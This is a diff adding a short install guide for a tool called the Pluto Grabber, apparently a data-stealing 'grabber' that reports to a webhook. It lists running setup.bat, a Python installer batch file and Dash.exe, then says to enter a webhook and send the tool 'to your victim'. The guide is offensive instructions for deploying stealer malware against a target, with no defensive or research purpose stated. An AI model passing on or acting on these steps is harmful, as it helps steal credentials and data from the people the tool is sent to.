@@ -1,0 +1,15 @@
+HOW TO INSTALL THE PLUTO GRABBER
+_________________________________
+
+Firstly run the setup.bat file 
+
+Next open the python installer.bat
+
+Then open file named Dash.exe 
+
+Finally The Pluto Grabber will open 
+
+Enter the webhook and when you will send it to your victim
+
+Good Luck.
+____________________________________________________________
